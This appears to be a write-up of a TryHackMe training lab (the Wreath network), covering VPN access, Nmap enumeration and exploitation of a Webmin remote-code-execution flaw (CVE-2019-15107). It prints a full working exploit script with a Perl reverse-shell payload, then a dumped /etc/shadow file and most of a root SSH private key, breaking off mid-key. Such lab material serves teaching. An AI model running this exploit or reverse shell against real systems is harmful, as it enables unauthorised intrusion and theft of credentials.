## Wreath

#### Learn how to pivot through a network by compromising a public facing web machine and tunnelling your traffic to access other machines in Wreath's network. (Streak limitation only for non-subscribed users)

### Task 1 Intro Introduction

![Wreath Network](https://github.com/vrbait1107/CTF_WRITEUPS/blob/main/TryHackMe/images/Wreath/wreath-1.png)

Wreath is designed as a learning resource for beginners with a primary focus on:

- Pivoting
- Working with the Empire C2 (Command and Control) framework
- Simple Anti-Virus evasion techniques

The following topics will also be covered, albeit more briefly:

- Code Analysis (Python and PHP)
- Locating and modifying public exploits
- Simple webapp enumeration and exploitation
- Git Repository Analysis
- Simple Windows Post-Exploitation techniques
- CLI Firewall Administration (CentOS and Windows)
- Cross-Compilation techniques
- Coding wrapper programs
- Simple exfiltration techniques
- Formatting a pentest report

These will be taught in the course of exploiting the Wreath network.

This is designed as almost a sandbox environment to follow along with the teaching content; the focus will be on the above teaching points, rather than on initial access and privilege escalation exploits (contrary to other boxes on the platform where the focus is on the challenge).

**Tools:**
A zipfile containing the tools demonstrated throughout this room is attached to this task. That said, whilst these will work, it would be advisable to download the latest versions of the tools (as instructed by the tasks) during your progression through the content, rather than relying on the provided archive. The password for this zipfile is: `WreathNetwork.`

**Videos:**
[@DarkStar7471](https://twitter.com/DarkStar7471) has kindly created a series of videos to accompany the teaching content in the Wreath network. Please use these as your first line of support! Writeups in the form of pentest reports will also be made available.

The videos can be accessed directly from Dark's [YouTube channel](https://www.youtube.com/playlist?list=PLsqUCyw0Jf9sMYXly0uuwfKMu34roGNwk); however, each task in this room also contains a link to the relevant video.

Look for the "Play" button at the very bottom right of the screen:

This will update on a task-by-task basis so that it always points to the correct video.

**Prerequisites:**
This network is designed for beginners, but assumes basic competence in the [Linux command line](https://tryhackme.com/room/tryhackme.com/room/linuxfundamentalspart1) and fundamental hacking methodology. The ability to read and write a little code will also be useful. Any other required knowledge will be linked throughout the tasks. If you need help, please feel free to ask in the [TryHackMe Discord](https://discord.gg/tryhackme) -- there is a channel set up for this purpose in the help section there.

**Conduct:**
As this network is shared amongst a number of people, it goes without saying: please don't mess things up for others in the network. There are no password changes required in any of these tasks, and no files need deleted. At various stages in this network it will be necessary to upload files and tools to the remote box. Please upload these in the format: `toolname-username` (e.g. `socat-MuirlandOracle`, `shell-MuirlandOracle`.aspx, etc) to avoid overwriting work belonging to anyone else. In short, don't be a troll, be respectful, and have fun!

With that being said:- let's get started!

**_Answer the questions below_**

1. **Read the introduction.**

- **_No Answer Needed._**

---

### Task 2: Intro Accessing the Network

Before we get into the content, we need to know how to access the network.

Joining the network requires a 7 day streak or a subscription to TryHackMe. To limit the number of networks which have to stay active at any one point, network access will last for 10 days after joining, at which point you will be automatically be removed; however, rejoining does not require a streak so if you didn't manage to finish within the ten days, you are free to rejoin immediately and keep at it from where you left off. Progress will not be reset.

Whether you are using the AttackBox or a local machine to connect to the TryHackMe network, you will need to use OpenVPN with a connection pack specifically designed for this network.

If you are using a local machine then you will need to download a configuration pack from the [Access](https://tryhackme.com/access) page.

If you are a subscriber and are using the AttackBox then you will be able to find this connection pack in a directory on your desktop. This will be automatically connected when the AttackBox starts so **don't run the connection pack manually on the AttackBox if you are a subscriber.**

If you are not subscribed then you will need to download the connection pack as normal, copy and paste the contents into a file on the AttackBox, then connect as you would on a local VM.

Be aware that this is still a VPN (albeit with an automated startup sequence) on the AttackBox so you will need to use `ip a` to see your available IP addresses. Pick the one that starts with 10.50.x.x and use that for all reverse connections in the network.

**_Note:_** _You are encouraged to use your own VM when attacking the Wreath Network. The content in this room will be difficult to cover in the time available with a single AttackBox and the persistence of a local VM will be hugely advantageous. Equally, certain sections (such as the Empire section) will be very difficult to perform in the AttackBox. If you don't have a local Kali VM, pre-built versions can be found for VMware or VirtualBox; however, installing manually tends to be more reliable if you are comfortable doing so._

**_Answer the questions below_**

On the access page, click on the "Network" tab, then select "Wreath" from the dropdown menu:

![VPN](https://github.com/vrbait1107/CTF_WRITEUPS/blob/main/TryHackMe/images/Wreath/wreath-2.png)

**_Note:_** _this will only appear if you have joined the room. If you are only viewing the room just now, click the "Join" button at the top right of this page!_

1. **Click on the green download button on the access page and save the configuration pack somewhere on your local machine. If this does not work then you may have to click on the "Regenerate" button first, then give it ten seconds before attempting to download the pack.**

- **_No Answer Needed._**

Connecting to OpenVPN on Linux (using either Kali or the AttackBox) can be accomplished using the `openvpn` client.

To do this, from the same directory we saved the config in we use the command:
`sudo openvpn CONFIG_NAME.ovpn`

Obviously replacing the name of the config with the config that you downloaded. Wreath config packs follow a naming scheme of USERNAME-wreath.ovpn, so an example command might be:
`sudo openvpn MuirlandOracle-wreath.ovpn`

![VPN CONNECTION](https://github.com/vrbait1107/CTF_WRITEUPS/blob/main/TryHackMe/images/Wreath/wreath-3.png)

1. **This should give you access to the Wreath network!**

- **_No Answer Needed._**

2. **Without closing the connection, open a new terminal (Ctrl + T in most cases). This is the easiest way (technically speaking) to run the OpenVPN client in the background whilst still being able to use the CLI. If you are comfortable using a terminal multiplexer (e.g. Tmux) to create a connection in the background then doing so would be a more elegant solution.**

- **_No Answer Needed._**

**Controlling the Network:**

The network has three states: Running, Stopped, and Resetting.

The current state can be shown at the top right of the network box at the top of the page:

![Wreath Network Structure](https://github.com/vrbait1107/CTF_WRITEUPS/blob/main/TryHackMe/images/Wreath/wreath-4.png)

- Running means that the network is fully operational and can be connected to at will
- Stopped indicates that the network has gone to sleep. This happens when no one has pressed the "Extend" button within a set time limit so as to prevent the network from being constantly running with no one using it. It can be restarted by pressing the "Start" button. This does not reset the network back to a clean copy, so anything stored on the targets should still be there
- Resetting indicates that the network is currently in the process of being wiped clean and resetting back to its default state. This can be used when something (or someone) has happened to one of the targets rendering it broken

The three buttons below the network map can be used to control this functionality:

![Wreath Network Control Buttons](https://github.com/vrbait1107/CTF_WRITEUPS/blob/main/TryHackMe/images/Wreath/wreath-5.png)

- The "Start" button restarts the network once stopped
- The "Extend" button prevents the network from going to sleep. This button also contains a timer showing how long until the network shuts down
- The "Reset" button initiates a full wipe of the network. This requires a percentage of users in the network to click the button, thus preventing a single person from spamming resets

1. **Finally, the "Network Uptime" field at the bottom right of the network map indicates how long the network has been awake for. This is not necessarily the time since the last reset.**

- **_No Answer Needed._**

---

### Task 3: Intro Backstory

_Out of the blue, an old friend from university: Thomas Wreath, calls you after several years of no contact. You spend a few minutes catching up before he reveals the real reason he called:_

**_"So I heard you got into hacking? That's awesome! I have a few servers set up on my home network for my projects, I was wondering if you might like to assess them?"_**

_You take a moment to think about it, before deciding to accept the job -- it's for a friend after all._

_Turning down his offer of payment, you tell him:_

**_Answer the questions below_**

1. **I'll do it!**

- **_No Answer Needed._**

---

### Task 4: Intro Brief

Thomas has sent over the following information about the network:

_There are two machines on my home network that host projects and stuff I'm working on in my own time -- one of them has a webserver that's port forwarded, so that's your way in if you can find a vulnerability! It's serving a website that's pushed to my git server from my own PC for version control, then cloned to the public facing server. See if you can get into these! My own PC is also on that network, but I doubt you'll be able to get into that as it has protections turned on, doesn't run anything vulnerable, and can't be accessed by the public-facing section of the network. Well, I say PC -- it's technically a repurposed server because I had a spare license lying around, but same difference._

From this we can take away the following pieces of information:

- There are three machines on the network
- There is at least one public facing webserver
- There is a self-hosted git server somewhere on the network
- The git server is internal, so Thomas may have pushed sensitive information into it
- There is a PC running on the network that has antivirus installed, meaning we can hazard a guess that this is likely to be Windows
- By the sounds of it this is likely to be the server variant of Windows, which might work in our favour
  The (assumed) Windows PC cannot be accessed directly from the webserver

This is enough to get started!

**_Note:_** _You are also encouraged to treat this Network like a penetration test -- i.e. take notes and screenshots of every step and write a full report at the end (especially if you're not already familiar with writing such reports). Keeping track of any files (e.g. tools or payloads) and users you create would also be a good idea. Reports will not be marked, but the act of writing them is good practice for any professional work -- or certifications -- you may do in the future. There will be more information on the actual report writing in the `Debrief & Report` task, but for now just focus on extensive notes and screenshots. If you are not already comfortable taking notes, have a look into CherryTree or Notion as hierarchical notetaking applications and focus on documenting every step of the process. This room is written in a way that encourages easy note taking, so note down your kill-chain as you go along, and take lots of screenshots! Reports can be submitted to the room as writeups (in the format specified in the questions of the `Debrief & Report` task) -- the first five high-quality writeups submitted to the room are featured here!_

- [CheckN8](https://assets.tryhackme.com/additional/wreath-network/writeups/CheckN8%20-%20Wreath.pdf)
- [fil](https://assets.tryhackme.com/additional/wreath-network/writeups/lolKatz%20-%20Wreath.pdf)
- [SefD](https://assets.tryhackme.com/additional/wreath-network/writeups/SefD%20-%20Wreath.pdf)
- [M4t35Z](https://assets.tryhackme.com/additional/wreath-network/writeups/M4t35Z%20-%20Wreath.pdf)
- [IamNobody](https://assets.tryhackme.com/additional/wreath-network/writeups/IamNobody%20-%20Wreath.pdf)

**_Answer the questions below_**

1. **Let's go!**

- **_No Answer Needed._**

**Before we start, if you are using Kali, make sure that it's up to date:**
`sudo apt update && sudo apt upgrade`

2. **This should not be necessary on the AttackBox.**

- **_Ans: No Answer Needed._**

---

### Task 5: Webserver Enumeration

**As with any attack, we first begin with the enumeration phase. Completing the [Nmap](https://tryhackme.com/room/furthernmap) room (if you haven't already) will help with this section.**

**Thomas gave us an IP to work with (shown on the Network Panel at the top of the page). Let's start by performing a port scan on the first 15000 ports of this IP.**

**_Note:_** _Here (and in general), it's a good idea to save your scan results to a file so you don't have to re-run the same scan twice._

**_Answer the questions below_**

**NMAP SCAN**

```
# Nmap 7.91 scan initiated Mon Sep 20 21:40:16 2021 as: "C:\\Program Files\\Nmap\\nmap.exe" -sC -sV -p 1-15000 -oN nmap.txt 10.200.193.200
Nmap scan report for 10.200.193.200
Host is up (0.60s latency).
Not shown: 14995 filtered ports
PORT      STATE  SERVICE    VERSION
22/tcp    open   ssh        OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey:
|   3072 9c:1b:d4:b4:05:4d:88:99:ce:09:1f:c1:15:6a:d4:7e (RSA)
|   256 93:55:b4:d9:8b:70:ae:8e:95:0d:c2:b6:d2:03:89:a4 (ECDSA)
|_  256 f0:61:5a:55:34:9b:b7:b8:3a:46:ca:7d:9f:dc:fa:12 (ED25519)
80/tcp    open   http       Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1c
|_http-title: Did not follow redirect to https://thomaswreath.thm
443/tcp   open   ssl/http   Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1c
|_http-title: Thomas Wreath | Developer
| ssl-cert: Subject: commonName=thomaswreath.thm/organizationName=Thomas Wreath Development/stateOrProvinceName=East Riding Yorkshire/countryName=GB
| Not valid before: 2021-09-20T14:45:20
|_Not valid after:  2022-09-20T14:45:20
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
9090/tcp  closed zeus-admin
10000/tcp open   http       MiniServ 1.890 (Webmin httpd)
|_http-server-header: MiniServ/1.890
|_http-title: Login to Webmin
|_http-trane-info: Problem with XML parsing of /evox/about

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Sep 20 21:52:16 2021 -- 1 IP address (1 host up) scanned in 720.76 seconds

```

1. **How many of the first 15000 ports are open on the target?**

- **_4_**

2.  **Perform a service scan on these open ports.**
    **What OS does Nmap think is running?**

- **_centos_**

3. **Okay, we know what we're dealing with.**

**Open the IP in your browser -- what site does the server try to redirect you to?**

- **_https://thomaswreath.thm/_**

4. **You will have noticed that the site failed to resolve. Looks like Thomas forgot to set up the DNS!**

Add it to your hosts file manually. This can be accomplished by editing the `/etc/hosts` file on Linux/MacOS, or `C:\Windows\System32\drivers\etc\hosts` on Windows, to include the IP address, followed by a tab, then the domain name. Note: this must be done as root/Administrator.

It should look something like this when done, although the IP address and domain name will be different:
`10.10.10.10 example.thm`

```
10.200.193.200 https://thomaswreath.thm/


# localhost name resolution is handled within DNS itself.
#	127.0.0.1       localhost
#	::1             localhost

```

- **_No Answer Needed._**

5. Reload the webpage -- it should now resolve, but it will give you a different error related to the TLS certificate. This occurs because the box is not really connected to the internet and so cannot have a signed TLS certificate. In this instance it is safe to click "Advanced" -> "Accept Risk"; however, you should never do this in the real world.

In real life we would perform a "footprinting" phase of the engagement at this point. This essentially involves finding as much public information about the target as possible and noting it down. You never know what could prove useful!

**Read through the text on the page. What is Thomas' mobile phone number?**

- **_Ans:+447821548812_**

![Thomas Mobile Number](https://github.com/vrbait1107/CTF_WRITEUPS/blob/main/TryHackMe/images/Wreath/wreath-6.png)

6. **Let's have a look at the highest open port.**

**Look back at your service scan results: what server version does Nmap detect as running here?**

- **_MiniServ 1.890 (Webmin httpd)_**

7. **Put your answer to the last question into Google.**

**It appears that this service is vulnerable to an unauthenticated remote code execution exploit!**

**What is the CVE number for this exploit?**

- **_CVE-2019-15107_**

![Webmin Exploit](https://github.com/vrbait1107/CTF_WRITEUPS/blob/main/TryHackMe/images/Wreath/wreath-7.png)

8. **We have everything we need to break into this machine, so let's get going!**

- **_No Answer Needed_**

---

### Task 6: Webserver Exploitation

In the previous task we found a vulnerable service[1][2] running on the target which will give us the ability to execute commands on the target.

The next step would usually be to find an exploit for this vulnerability. There are often exploits available online for known vulnerabilities (and we will cover searching for these in an upcoming task!), however, in this instance, an exploit is provided here.

Start by cloning the repository. This can be done with the following command:

`git clone https://github.com/MuirlandOracle/CVE-2019-15107`

This creates a local copy of the exploit on our attacking machine. Navigate into the folder then install the required Python libraries:

`cd CVE-2019-15107 && pip3 install -r requirements.txt`

If this doesn't work, you may need to install pip before downloading the libraries. This can be done with:
`sudo apt install python3-pip`

The script should already be executable, but if not, add the executable bit (`chmod +x ./CVE-2019-15107.py`).

Never run an unknown script from the internet! Read through the code and see if you can get an idea of what it's doing. (Don't worry if you aren't familiar with Python -- in this case the exploit was coded by the author of this content and is being run in a lab environment, so you can infer that it isn't malicious. It is, however, good practice to read through scripts before running them).

Once you're satisfied that the script will do what it says it will, run the exploit against the target!

`./CVE-2019-15107.py TARGET_IP`

![RCE Exploit](https://github.com/vrbait1107/CTF_WRITEUPS/blob/main/TryHackMe/images/Wreath/wreath-8.png)

https://sensorstechforum.com/cve-2019-15107-webmin/
https://www.webmin.com/exploit.html

**_Answer The Following_**

1. **Run the exploit and obtain a pseudoshell on the target!**

- **_No Answer Needed._**

**EXPLOIT**

```python

#!/usr/bin/python3
#Webmin 1.890-1.920 RCE
#CVE-2019-15107
#Based on Metasploit Module (EDB ID: 47230)
#AG | MuirlandOracle
#11/20

#### Imports ####
import argparse, requests, sys, signal, ssl, random, string, os, socket
from prompt_toolkit import prompt
from prompt_toolkit.history import FileHistory
from urllib3.exceptions import InsecureRequestWarning


#### Globals ####
class colours():
	red = "\033[91m"
	green = "\033[92m"
	blue = "\033[34m"
	orange = "\033[33m"
	purple = "\033[35m"
	end = "\033[0m"


banner = (f"""{colours.orange}
	__        __   _               _         ____   ____ _____
	\ \      / /__| |__  _ __ ___ (_)_ __   |  _ \ / ___| ____|
	 \ \ /\ / / _ \ '_ \| '_ ` _ \| | '_ \  | |_) | |   |  _|
	  \ V  V /  __/ |_) | | | | | | | | | | |  _ <| |___| |___
	   \_/\_/ \___|_.__/|_| |_| |_|_|_| |_| |_| \_\\____|_____|

						{colours.purple}@MuirlandOracle

		{colours.end}""")

#### Ignore Unverified SSL certs ####
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

#### Handle Signals ####
def sigHandler(sig, frame):
	print(f"{colours.blue}\n[*] Exiting....{colours.end}\n")
	sys.exit(0);

#### Exploit Class ####
class Exploit():
	def __init__(self):
		self.endpoint = "password_change.cgi"
		self.versions = ["1.890", "1.900", "1.910", "1.920"]
		#Start a session
		self.session = requests.Session()
		self.session.verify = False

	#### Colour Helpers ####
	def fail(self, reason, die=True):
		if not self.args.accessible:
			print(f"{colours.red}[-] {reason}{colours.end}")
		else:
			print(f"Failure: {reason}")
		if die:
			sys.exit(0)

	def success(self, text):
		if not self.args.accessible:
			print(f"{colours.green}[+] {text}{colours.end}")
		else:
			print(f"Success: {text}")

	def warn(self, text):
		if not self.args.accessible:
			print(f"{colours.orange}[*] {text}{colours.end}")
		else:
			print(f"Warning: {text}")

	def info(self, text):
		if not self.args.accessible:
			print(f"{colours.blue}[*] {text}{colours.end}")
		else:
			print(f"Info: {text}")



	#### Argument Parsing ####
	def parseArgs(self):
		parser = argparse.ArgumentParser(description="CVE-2019-15107 Webmin Unauthenticated RCE (1.890-1.920) Framework")
		parser.add_argument("target", help="The target IP or domain")
		parser.add_argument("-b", "--basedir", help="The base directory of webmin (default: /)", default="/")
		parser.add_argument("-s", "--ssl", help="Specify to use SSL", default="http://",  const="https://", action="store_const")
		parser.add_argument("-p", "--port", type=int, default=10000, help="The target port (default: 10000)")
		parser.add_argument("--accessible", default=False, action="store_true", help="Remove ascii art")
		parser.add_argument("--force", default=False, action="store_true", help="Force exploitation with no checks")
		args = parser.parse_args()

		#Validation
		args.basedir = f"/{args.basedir}" if (args.basedir[0] != "/") else f"{args.basedir}"
		if args.port not in range(1,65535):
			self.fail(f"Invalid Port: {args.port}")
		self.args = args


	#### Checks ####
	def checkConnect(self):
		target = f"{self.args.ssl}{self.args.target}:{self.args.port}{self.args.basedir}"
		try:
			r = self.session.get(target, timeout=5)
		except requests.exceptions.SSLError:
			self.info("Server is running without SSL. Switching to HTTP")
			self.args.ssl = "http://"
			self.checkConnect()
			return
		except:
			self.fail(f"Failed to connect to {target}")
		if " SSL " in r.content.decode().upper():
			self.info("Server is running in SSL mode. Switching to HTTPS")
			self.args.ssl = "https://"
			self.checkConnect()
			return
		self.success(f"Connected to {target} successfully.")


	def checkVersion(self):
		target = f"{self.args.ssl}{self.args.target}:{self.args.port}{self.args.basedir}"
		r = self.session.get(target)
		try:
			version = r.headers["Server"].split("/")[1]
		except:
			self.fail("Couldn't find server version")
		if version not in self.versions:
			self.fail(f"Server version ({version}) not vulnerable.")
		else:
			self.success(f"Server version ({version}) should be vulnerable!")
			if version != self.versions[0]:
				self.warn("Server version relies on expired password changing feature being enabled")


	def checkVulnerable(self):
		target = f"{self.args.ssl}{self.args.target}:{self.args.port}{self.args.basedir}"
		testString = "".join(random.choices(string.ascii_letters + string.digits, k=8))
		check = self.exploitVuln(f"echo {testString}")
		if testString in check:
			self.success("Benign Payload executed!")
		elif "Password changing is not enabled" in check:
			self.fail("Password changing is disabled for this server")
		else:
			self.fail("Benign Payload failed to execute")

	def runChecks(self):
		self.checkConnect()
		self.checkVersion()
		self.checkVulnerable()

	#### Exploit ####
	def exploitVuln(self, command):
		slash = lambda: "/" if (self.args.basedir[-1] != "/") else ""
		target = f"{self.args.ssl}{self.args.target}:{self.args.port}{self.args.basedir}{slash()}{self.endpoint}"
		token = "".join(random.choices(string.ascii_letters + string.digits, k=8))
		headers = {
			"Referer":f"{self.args.ssl}{self.args.target}:{self.args.port}{self.args.basedir}"
		}
		params = {
			#Param for 1.890
			"expired":command,
			#Params for 1.900-1.920
			"new1":token,
			"new2":token,
			"old":command
		}
		try:
			r = self.session.post(target, data=params, headers=headers, timeout=5)
		except:
			return "Error"
		return(r.content.decode())


	def pseudoShell(self):
		print()
		if not self.args.force:
			self.success("The target is vulnerable and a pseudoshell has been obtained.\n"
						"Type commands to have them executed on the target.")
			self.info("Type 'exit' to exit.")
			self.info("Type 'shell' to obtain a full reverse shell (UNIX only).")
		else:
			self.warn("Warning: No checks have been carried out -- proceed with caution!")
		print()
		while True:
			try:
				command = prompt("# ", history=FileHistory("commands.txt"))
			except KeyboardInterrupt:
				self.info("Exiting...\n")
				sys.exit(0)
			if command.lower() == "quit" or command.lower() == "exit":
				self.info("Exiting...\n")
				sys.exit(0)
			elif command.lower() == "shell":
				self.shell()
				continue
			elif len(command) == 0:
				continue
			results = self.exploitVuln(f"echo SPLIT; {command} 2>&1; echo SPLIT")
			if "SPLIT" in results:
				print(results.split("SPLIT")[1].strip())
			else:
				self.fail("Failed to execute command", False)
				if self.args.force:
					print("(This is why checks exist)")

	def shell(self):
		print()
		self.info("Starting the reverse shell process")
		self.warn("For UNIX targets only!")
		self.warn("Use 'exit' to return to the pseudoshell at any time")
		#Get IP
		while True:
			ip = input("Please enter the IP address for the shell: ")
			if ip.lower() == "exit":
				return
			try:
				socket.inet_aton(ip)
			except socket.error:
				self.fail("Invalid IP address\n", False)
				continue
			break

		#Get port
		while True:
			port = input("Please enter the port number for the shell: ")
			if port.lower() == "exit":
				return
			try:
				port = int(port)
				assert(port < 65535 and port >= 1)
			except:
				self.fail("Invalid port number\n", False)
				continue
			break

		#It's webmin, so perl must be installed
		shellcode = "perl -e 'use Socket;$i=\"" + ip + "\";$p=" + str(port) + ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"

		print()
		sudoCheck = lambda: "sudo " if (port < 1024) else ""
		self.warn(f"Start a netcat listener in a new window ({sudoCheck()}nc -lvnp {port}) then press enter.")
		input()
		self.exploitVuln(shellcode)
		self.success("You should now have a reverse shell on the target")
		self.warn("If this is not the case, please check your IP and chosen port\nIf these are correct then there is likely a firewall preventing the reverse connection. Try choosing a well-known port such as 443 or 53")


#### Run ####
if __name__ == "__main__":
	signal.signal(signal.SIGINT, sigHandler)
	exploit = Exploit()
	exploit.parseArgs()
	if not exploit.args.accessible:
		print(banner)
	else:
		print("Webmin RCE Exploit, code written by @MuirlandOracle")
	if not exploit.args.force:
		exploit.runChecks()
	exploit.pseudoShell()

```

2. **Which user was the server running as?**

- **_root_**

```

PS C:\Users\something\Desktop\CVE-2019-15107> python .\CVE-2019-15107.py 10.200.193.200
←[33m
        __        __   _               _         ____   ____ _____
        \ \      / /__| |__  _ __ ___ (_)_ __   |  _ \ / ___| ____|
         \ \ /\ / / _ \ '_ \| '_ ` _ \| | '_ \  | |_) | |   |  _|
          \ V  V /  __/ |_) | | | | | | | | | | |  _ <| |___| |___
           \_/\_/ \___|_.__/|_| |_| |_|_|_| |_| |_| \_\____|_____|

                                                ←[35m@MuirlandOracle

                ←[0m
←[34m[*] Server is running in SSL mode. Switching to HTTPS←[0m
←[92m[+] Connected to https://10.200.193.200:10000/ successfully.←[0m
←[92m[+] Server version (1.890) should be vulnerable!←[0m
←[92m[+] Benign Payload executed!←[0m

←[92m[+] The target is vulnerable and a pseudoshell has been obtained.
Type commands to have them executed on the target.←[0m
←[34m[*] Type 'exit' to exit.←[0m
←[34m[*] Type 'shell' to obtain a full reverse shell (UNIX only).←[0m

# root
sh: root: command not found
# whoami
root

```

3. **Success! We won't need to escalate privileges here, so we can move on to the next step in the exploitation process.**

**Before we do though: nice though this pseudoshell is, it's not a full reverse shell.**

**Get a reverse shell from the target. You can either do this manually, or by typing shell into the pseudoshell and following the instructions given.**

- **_No Answer Needed._**

4. **Optional: Stabilise the reverse shell. There are several techniques for doing this detailed [here](https://tryhackme.com/room/introtoshells).**

- **_No Answer Needed._**

5. **Now for a little post-exploitation!**

**What is the root user's password hash?**

- **_$6$i9vT8tk3SoXXxK2P$HDIAwho9FOdd4QCecIJKwAwwh8Hwl.BdsbMOUAd3X/chSCvrmpfy.5lrLgnRVNq6/6g0PxK9VqSdy47/qKXad1_**

```
# cat /etc/shadow
root:$6$i9vT8tk3SoXXxK2P$HDIAwho9FOdd4QCecIJKwAwwh8Hwl.BdsbMOUAd3X/chSCvrmpfy.5lrLgnRVNq6/6g0PxK9VqSdy47/qKXad1::0:99999:7:::
bin:*:18358:0:99999:7:::
daemon:*:18358:0:99999:7:::
adm:*:18358:0:99999:7:::
lp:*:18358:0:99999:7:::
sync:*:18358:0:99999:7:::
shutdown:*:18358:0:99999:7:::
halt:*:18358:0:99999:7:::
mail:*:18358:0:99999:7:::
operator:*:18358:0:99999:7:::
games:*:18358:0:99999:7:::
ftp:*:18358:0:99999:7:::
nobody:*:18358:0:99999:7:::
dbus:!!:18573::::::
systemd-coredump:!!:18573::::::
systemd-resolve:!!:18573::::::
tss:!!:18573::::::
polkitd:!!:18573::::::
libstoragemgmt:!!:18573::::::
cockpit-ws:!!:18573::::::
cockpit-wsinstance:!!:18573::::::
sssd:!!:18573::::::
sshd:!!:18573::::::
chrony:!!:18573::::::
rngd:!!:18573::::::
twreath:$6$0my5n311RD7EiK3J$zVFV3WAPCm/dBxzz0a7uDwbQenLohKiunjlDonkqx1huhjmFYZe0RmCPsHmW3OnWYwf8RWPdXAdbtYpkJCReg.::0:99999:7:::
unbound:!!:18573::::::
apache:!!:18573::::::
nginx:!!:18573::::::
mysql:!!:18573::::::
#

```

6. **You won't be able to crack the root password hash, but you might be able to find a certain file that will give you consistent access to the root user account through one of the other services on the box.**

**What is the full path to this file?**

- **_Ans: /root/.ssh/id_rsa_**

```
$
[root@prod-serv ]# cd ~
[root@prod-serv ~]# cd .ssh
[root@prod-serv .ssh]# ls -la
total 16
drwx------. 2 root root   80 Jan  6  2021 .
dr-xr-x---. 3 root root  202 Sep 21 13:54 ..
-rw-r--r--. 1 root root  571 Nov  7  2020 authorized_keys
-rw-------. 1 root root 2602 Nov  7  2020 id_rsa
-rw-r--r--. 1 root root  571 Nov  7  2020 id_rsa.pub
-rw-r--r--. 1 root root  347 Sep 21 14:41 known_hosts
[root@prod-serv .ssh]# cat id_rsa
bash: catid_rsa: command not found
[root@prod-serv .ssh]# cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
